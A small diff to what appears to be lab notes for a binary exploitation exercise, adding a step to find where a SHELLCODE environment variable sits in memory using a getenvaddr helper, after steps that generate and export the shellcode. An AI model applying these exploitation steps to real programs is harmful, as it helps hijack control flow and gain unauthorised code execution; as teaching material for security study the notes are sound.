@@ -16,3 +16,8 @@ objdump -S 02_vuln_func_ptr
 export SHELLCODE=$(perl gen-payload.pl)
 echo $SHELLCODE
 ```
+
+## Get Environment Variable location compared to executable name
+```
+./getenvaddr  SHELLCODE ./prog
+```
